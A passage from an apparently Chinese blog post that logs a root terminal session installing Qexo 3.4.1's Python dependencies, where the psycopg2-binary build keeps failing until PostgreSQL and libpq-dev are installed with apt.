class="hljs-number">28</span>fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-<span class="hljs-number">2.2</span>.<span class="hljs-number">1</span>-py3-none-any.whl (<span class="hljs-number">269</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">276</span>kB <span class="hljs-number">5.1</span>MB/s <br>Collecting sqlparse==<span class="hljs-number">0.2</span>.<span class="hljs-number">4</span> (from -r requirements.txt (line <span class="hljs-number">15</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">65</span><span class="hljs-regexp">/85/</span><span class="hljs-number">20</span>bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-<span class="hljs-number">0.2</span>.<span class="hljs-number">4</span>-py2.py3-none-any.whl<br>Collecting psycopg2-binary==<span class="hljs-number">2.9</span>.<span class="hljs-number">9</span> (from -r requirements.txt (line <span class="hljs-number">16</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>fc<span class="hljs-regexp">/07/</span>e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-<span class="hljs-number">2.9</span>.<span class="hljs-number">9</span>.tar.gz (<span class="hljs-number">384</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">389</span>kB <span class="hljs-number">3.1</span>MB/s <br>    Complete output from command python setup.py egg_info:<br>    running egg_info<br>    creating pip-egg-info/psycopg2_binary.egg-info<br>    writing pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>PKG-INFO<br>    writing dependency_links to pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>dependency_links.txt<br>    writing top-level names to pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>top_level.txt<br>    writing manifest file <span class="hljs-string">&#x27;pip-egg-info/psycopg2_binary.egg-info/SOURCES.txt&#x27;</span><br>    <br>    Error: pg_config executable not found.<br>    <br>    pg_config is required to build psycopg2 from source.  Please add the directory<br>    containing pg_config to the <span class="hljs-variable">$PATH</span> or specify the full executable path with the<br>    option:<br>    <br>        python setup.py build_ext --pg-config <span class="hljs-regexp">/path/</span>to/pg_config build ...<br>    <br>    or with the pg_config option <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;setup.cfg&#x27;</span>.<br>    <br>    If you prefer to avoid building psycopg2 from source, please install the PyPI<br>    <span class="hljs-string">&#x27;psycopg2-binary&#x27;</span> package instead.<br>    <br>    For further information please check the <span class="hljs-string">&#x27;doc/src/install.rst&#x27;</span> file (also at<br>    &lt;https:<span class="hljs-regexp">//</span>www.psycopg.org<span class="hljs-regexp">/docs/i</span>nstall.html&gt;).<br>    <br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/tmp/</span>pip-build-<span class="hljs-number">65</span>ez5n40<span class="hljs-regexp">/psycopg2-binary/</span><br>[root@ningan Qexo-<span class="hljs-number">3.4</span>.<span class="hljs-number">1</span>]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="小插曲：安装postgresql"><a href="#小插曲：安装postgresql" class="headerlink" title="小插曲：安装postgresql"></a>小插曲：安装postgresql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br><br>Command <span class="hljs-string">&#x27;psql&#x27;</span> not found, but can be installed with:<br><br>apt install postgresql-client-common<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo apt install postgresql postgresql-contrib</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following additional packages will be installed:<br>  libpq5 postgresql-10 postgresql-client-10 postgresql-client-common postgresql-common sysstat<br>Suggested packages:<br>  postgresql-doc locales-all postgresql-doc-10 libjson-perl isag<br>The following NEW packages will be installed:<br>  libpq5 postgresql postgresql-10 postgresql-client-10 postgresql-client-common postgresql-common postgresql-contrib sysstat<br>0 upgraded, 8 newly installed, 0 to remove and 7 not upgraded.<br>Need to get 5,326 kB of archives.<br>After this operation, 20.9 MB of additional disk space will be used.<br>Do you want to <span class="hljs-built_in">continue</span>? [Y/n] y<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 libpq5 amd64 10.23-0ubuntu0.18.04.2 [107 kB]<br>Get:2 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-client-common all 190ubuntu0.1 [29.6 kB]<br>Get:3 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-client-10 amd64 10.23-0ubuntu0.18.04.2 [943 kB]<br>Get:4 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-common all 190ubuntu0.1 [157 kB]<br>Get:5 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-10 amd64 10.23-0ubuntu0.18.04.2 [3,781 kB]<br>Get:6 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql all 10+190ubuntu0.1 [5,884 B]<br>Get:7 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-contrib all 10+190ubuntu0.1 [5,896 B]<br>Get:8 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 sysstat amd64 11.6.1-1ubuntu0.2 [295 kB]<br>Fetched 5,326 kB <span class="hljs-keyword">in</span> 3s (2,006 kB/s)<br>Preconfiguring packages ...<br>Selecting previously unselected package libpq5:amd64.<br>(Reading database ... 278744 files and directories currently installed.)<br>Preparing to unpack .../0-libpq5_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking libpq5:amd64 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql-client-common.<br>Preparing to unpack .../1-postgresql-client-common_190ubuntu0.1_all.deb ...<br>Unpacking postgresql-client-common (190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-client-10.<br>Preparing to unpack .../2-postgresql-client-10_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking postgresql-client-10 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql-common.<br>Preparing to unpack .../3-postgresql-common_190ubuntu0.1_all.deb ...<br>Adding <span class="hljs-string">&#x27;diversion of /usr/bin/pg_config to /usr/bin/pg_config.libpq-dev by postgresql-common&#x27;</span><br>Unpacking postgresql-common (190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-10.<br>Preparing to unpack .../4-postgresql-10_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking postgresql-10 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql.<br>Preparing to unpack .../5-postgresql_10+190ubuntu0.1_all.deb ...<br>Unpacking postgresql (10+190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-contrib.<br>Preparing to unpack .../6-postgresql-contrib_10+190ubuntu0.1_all.deb ...<br>Unpacking postgresql-contrib (10+190ubuntu0.1) ...<br>Selecting previously unselected package sysstat.<br>Preparing to unpack .../7-sysstat_11.6.1-1ubuntu0.2_amd64.deb ...<br>Unpacking sysstat (11.6.1-1ubuntu0.2) ...<br>Setting up sysstat (11.6.1-1ubuntu0.2) ...<br><br>Creating config file /etc/default/sysstat with new version<br>update-alternatives: using /usr/bin/sar.sysstat to provide /usr/bin/sar (sar) <span class="hljs-keyword">in</span> auto mode<br>Created symlink /etc/systemd/system/multi-user.target.wants/sysstat.service → /lib/systemd/system/sysstat.service.<br>Setting up libpq5:amd64 (10.23-0ubuntu0.18.04.2) ...<br>Setting up postgresql-client-common (190ubuntu0.1) ...<br>Setting up postgresql-common (190ubuntu0.1) ...<br>Adding user postgres to group ssl-cert<br><br>Creating config file /etc/postgresql-common/createcluster.conf with new version<br>Building PostgreSQL dictionaries from installed myspell/hunspell packages...<br>  en_us<br>Removing obsolete dictionary files:<br>Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /lib/systemd/system/postgresql.service.<br>Setting up postgresql-client-10 (10.23-0ubuntu0.18.04.2) ...<br>update-alternatives: using /usr/share/postgresql/10/man/man1/psql.1.gz to provide /usr/share/man/man1/psql.1.gz (psql.1.gz) <span class="hljs-keyword">in</span> auto mode<br>Setting up postgresql-10 (10.23-0ubuntu0.18.04.2) ...<br>Creating new PostgreSQL cluster 10/main ...<br>/usr/lib/postgresql/10/bin/initdb -D /var/lib/postgresql/10/main --auth-local peer --auth-host md5<br>The files belonging to this database system will be owned by user <span class="hljs-string">&quot;postgres&quot;</span>.<br>This user must also own the server process.<br><br>The database cluster will be initialized with locale <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>.<br>The default database encoding has accordingly been <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;UTF8&quot;</span>.<br>The default text search configuration will be <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;english&quot;</span>.<br><br>Data page checksums are disabled.<br><br>fixing permissions on existing directory /var/lib/postgresql/10/main ... ok<br>creating subdirectories ... ok<br>selecting default max_connections ... 100<br>selecting default shared_buffers ... 128MB<br>selecting default timezone ... Asia/Shanghai<br>selecting dynamic shared memory implementation ... posix<br>creating configuration files ... ok<br>running bootstrap script ... ok<br>performing post-bootstrap initialization ... ok<br>syncing data to disk ... ok<br><br>Success. You can now start the database server using:<br><br>    /usr/lib/postgresql/10/bin/pg_ctl -D /var/lib/postgresql/10/main -l logfile start<br><br>Ver Cluster Port Status Owner    Data directory              Log file<br>10  main    5432 down   postgres /var/lib/postgresql/10/main /var/log/postgresql/postgresql-10-main.log<br>update-alternatives: using /usr/share/postgresql/10/man/man1/postmaster.1.gz to provide /usr/share/man/man1/postmaster.1.gz (postmaster.1.gz) <span class="hljs-keyword">in</span> auto mode<br>Setting up postgresql (10+190ubuntu0.1) ...<br>Setting up postgresql-contrib (10+190ubuntu0.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> systemd (237-3ubuntu10.57) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> ureadahead (0.100.0-21) ...<br>Processing triggers <span class="hljs-keyword">for</span> libc-bin (2.27-3ubuntu1.6) ...<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo systemctl status postgresql</span><br>● postgresql.service - PostgreSQL RDBMS<br>   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)<br>   Active: active (exited) since Sat 2024-11-02 10:39:10 CST; 43s ago<br> Main PID: 19119 (code=exited, status=0/SUCCESS)<br>    Tasks: 0 (<span class="hljs-built_in">limit</span>: 4628)<br>   CGroup: /system.slice/postgresql.service<br><br>Nov 02 10:39:10 ningan systemd[1]: Starting PostgreSQL RDBMS...<br>Nov 02 10:39:10 ningan systemd[1]: Started PostgreSQL RDBMS.<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br>psql (PostgreSQL) 10.23 (Ubuntu 10.23-0ubuntu0.18.04.2)<br></code></pre></td></tr></table></figure><h3 id="回到主线-2"><a href="#回到主线-2" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached https://files.pythonhosted.org/packages/b0/53/aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-1.26.18-py2.py3-none-any.whl<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached https://files.pythonhosted.org/packages/42/f4/f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-3.5.2-py3-none-any.whl<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached https://files.pythonhosted.org/packages/1d/42/f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-1.3.9-py3-none-any.whl<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached https://files.pythonhosted.org/packages/a0/2c/7df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-4.1.0-py3-none-any.whl<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached https://files.pythonhosted.org/packages/0b/9c/e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-3.13.0-cp38-cp38-manylinux1_x86_64.whl<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached https://files.pythonhosted.org/packages/9b/ed/28fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-2.2.1-py3-none-any.whl<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached https://files.pythonhosted.org/packages/65/85/20bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-0.2.4-py2.py3-none-any.whl<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached https://files.pythonhosted.org/packages/fc/07/e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-2.9.9.tar.gz<br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    running egg_info<br>    creating pip-egg-info/psycopg2_binary.egg-info<br>    writing pip-egg-info/psycopg2_binary.egg-info/PKG-INFO<br>    writing dependency_links to pip-egg-info/psycopg2_binary.egg-info/dependency_links.txt<br>    writing top-level names to pip-egg-info/psycopg2_binary.egg-info/top_level.txt<br>    writing manifest file <span class="hljs-string">&#x27;pip-egg-info/psycopg2_binary.egg-info/SOURCES.txt&#x27;</span><br>    Error: pg_config --libdir failed: You need to install postgresql-server-dev-X.Y <span class="hljs-keyword">for</span> building a server-side extension or libpq-dev <span class="hljs-keyword">for</span> building a client-side application.<br>    <br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-gwmtudh3/psycopg2-binary/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><h3 id="小插曲：安装postgresql开发包"><a href="#小插曲：安装postgresql开发包" class="headerlink" title="小插曲：安装postgresql开发包"></a>小插曲：安装postgresql开发包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br>psql (PostgreSQL) 10.23 (Ubuntu 10.23-0ubuntu0.18.04.2)<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt install postgresql-server-dev-X.Y</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package postgresql-server-dev-X.Y<br>E: Couldn<span class="hljs-string">&#x27;t find any package by glob &#x27;</span>postgresql-server-dev-X.Y<span class="hljs-string">&#x27;</span><br><span class="hljs-string">E: Couldn&#x27;</span>t find any package by regex <span class="hljs-string">&#x27;postgresql-server-dev-X.Y&#x27;</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt install postgresql-server-dev-10.23</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package postgresql-server-dev-10.23<br>E: Couldn<span class="hljs-string">&#x27;t find any package by glob &#x27;</span>postgresql-server-dev-10.23<span class="hljs-string">&#x27;</span><br><span class="hljs-string">E: Couldn&#x27;</span>t find any package by regex <span class="hljs-string">&#x27;postgresql-server-dev-10.23&#x27;</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt  install libpq-dev</span><br>Reading package lists... Done<br>Building dependency tree... 50%<br>Building dependency tree       <br>Reading state information... Done<br>Suggested packages:<br>  postgresql-doc-10<br>The following NEW packages will be installed:<br>  libpq-dev<br>0 upgraded, 1 newly installed, 0 to remove and 7 not upgraded.<br>Need to get 219 kB of archives.<br>After this operation, 1,101 kB of additional disk space will be used.<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 libpq-dev amd64 10.23-0ubuntu0.18.04.2 [219 kB]<br>Fetched 219 kB <span class="hljs-keyword">in</span> 1s (415 kB/s)   <br>Selecting previously unselected package libpq-dev.<br>(Reading database ... 279540 files and directories currently installed.)<br>Preparing to unpack .../libpq-dev_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking libpq-dev (10.23-0ubuntu0.18.04.2) ...<br>Setting up libpq-dev (10.23-0ubuntu0.18.04.2) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br><br></code></pre></td></tr></table></figure><h3 id="回到主线-3"><a href="#回到主线-3" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached https://files.pythonhosted.org/packages/b0/53/aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-1.26.18-py2.py3-none-any.whl<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached https://files.pythonhosted.org/packages/42/f4/f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-3.5.2-py3-none-any.whl<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached https://files.pythonhosted.org/packages/1d/42/f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-1.3.9-py3-none-any.whl<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached https://files.pythonhosted.org/packages/a0/2c/7df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-4.1.0-py3-none-any.whl<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached https://files.pythonhosted.org/packages/0b/9c/e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-3.13.0-cp38-cp38-manylinux1_x86_64.whl<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached https://files.pythonhosted.org/packages/9b/ed/28fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-2.2.1-py3-none-any.whl<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached https://files.pythonhosted.org/packages/65/85/20bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-0.2.4-py2.py3-none-any.whl<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached 